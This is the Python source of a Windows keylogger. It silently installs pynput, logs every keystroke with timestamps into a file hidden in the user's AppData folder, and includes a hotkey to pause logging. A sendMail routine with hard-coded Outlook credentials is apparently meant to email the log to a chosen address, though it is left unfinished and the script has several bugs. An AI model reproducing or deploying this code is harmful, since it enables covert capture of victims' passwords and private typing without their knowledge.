from pynput import keyboard, mouse
from datetime import datetime as dt
import time
import threading
import subprocess
from os.path import exists
import psutil

killSwitch, capsOn, checked = False, False, False
currTime = dt.now().strftime('%d/%m/%Y %H:%M:%S - ')
email, letter, phrase = '', ''
path = r'C:\Users' + '\\' + str(psutil.users()[0].name) + r'\AppData\Local\Microsoft\Windows\textfile.txt'


subprocess.call(['pip','install', 'pynput'])

########################################################################################################################################################################
#checkFile - Helper method which checks if file exists, if file doesn't, then creates file. Uses checked to determine whether file has been "checked" before.
#updateFile - Thread that continously updates file with keystrokes every number of seconds
#writeToFile - Performs the actual writing of keystrokes to file
#
########################################################################################################################################################################
def checkFile():
    global checked
    if(not exists(path)):
        with open(path, 'w+') as f:
            f.write("KEYSTROKES\n")
    checked = True


def updateFile():
    global phrase
    global checked
    writeToFile('Keylogger Started')
    while True:
        if(not checked):
            checkFile()
        time.sleep(10)
        if(phrase == ''):
            continue
        writeToFile(phrase)
        phrase = ''
        if(killSwitch):
            return False


def writeToFile(text):
    with open(path, 'a+') as f:
        try:
            f.write(dt.now().strftime('%d/%m/%Y %H:%M:%S - ') + str(text) + '\n')
        except:
            global killSwitch
            killSwitch = True

########################################################################################################################################################################
#on_press - Records key when pressed and saves it as a joined string.
#on_relase - Ends program if needed, and verifies that a key is pressed & released.
#keyLog - Executs the actual keylogger.
########################################################################################################################################################################
def on_press(key):
    global capsOn
    global letter
    global phrase
    global checked
    try:
        letter = '{0}'.format(key.char)
        if(capsOn):
            letter = letter.upper()
    except AttributeError:
        match key:
            case keyboard.Key.ctrl_l | keyboard.Key.ctrl_r:
                letter = '[CTRL]'
            case keyboard.Key.alt_l | keyboard.Key.alt_gr:
                letter = '[ALT]'
            case keyboard.Key.space:
                letter = ' '
            case keyboard.Key.backspace:
                letter = '[BACKSPACE]'
            case keyboard.Key.tab:
                letter = '[TAB]'
            case keyboard.Key.delete:
                letter = '[DELETE]'
            case keyboard.Key.enter:
                letter = '[ENTER]\n'
            case keyboard.Key.caps_lock:
                capsOn = not capsOn
                if(capsOn):
                    letter = '[CAPSLOCK ON]'
                else:
                    letter = '[CAPSLOCK OFF]'
            case keyboard.Key.shift | keyboard.Key.shift_r:
                letter = '[SHIFT]'
    finally:
        phrase = phrase + letter
            
        
def on_release(key):
    global killSwitch
    try:
        if(killSwitch):
            return False
    except:
        pass

def keyLog():
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
        listener.join()

def hotKeys():
    listenerHotKeys = keyboard.GlobalHotKeys({
        '<ctrl>+<alt>+f': kill_prog})

def kill_prog():
    global killSwitch
    killSwitch = True
    writeToFile('Keylogger Paused')

########################################################################################################################################################################
#
########################################################################################################################################################################
def sendMail():
    global message
    global email
    with smtplib.SMTP('smtp-mail.outlook.com', 587) as session:
        session.starttls()
        session.login('testprogpython@outlook.com', 'TPPython')
        session.sendmail('testprogpython@outlook.com', email,message)
########################################################################################################################################################################
#main - Executes the program
########################################################################################################################################################################

threading.Thread(target=hotKeys).start()
threading.Thread(target=updateFile).start()
threading.Thread(target=keyLog).start()






